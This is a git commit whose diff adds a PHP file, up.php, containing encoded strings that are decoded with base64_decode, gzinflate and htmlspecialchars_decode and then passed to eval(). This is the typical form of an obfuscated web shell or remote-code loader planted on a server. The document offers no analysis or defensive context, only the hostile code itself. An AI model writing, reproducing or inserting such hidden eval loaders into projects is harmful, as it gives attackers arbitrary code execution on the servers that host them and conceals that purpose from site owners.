ff42d40af35151adb46c5b5875edc3b62c8d7d49
my5t3ryc0de <148623560+my5t3ryc0de@users.noreply.github.com>
2024-01-25 03:51:11 +0700

    up.php

---
+++ up.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "==gvt1CKH5l5Y+TpZLMO3S/JnlNqmM1cs9QHf4kPzRR1/iMrWZ19XwKDkbFCMd+Olkv/BDI/pPW5RAvv4Vv4XMXw2O1a/R4KnsRz2/YTpwPWVvb/KkJ0cU+vIq1iKJdUGZtomA09WjumpBik6St7e4wyaPweqt1VDmQbRhSA3labXphCxyy61WChxJbqcM2J4sSJv6LqkhhOlGv9y1FlxvglKgQdv01IP248y62wfYmZeI8hmSd3vL/aNqr1pSWgj1iqRwonSqkQSSp40POiPANkFFAED+vBvTEEwMsaB/YXci3/iAQ3BwJe/fBAoHw/SAQ7B8fDAIfA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
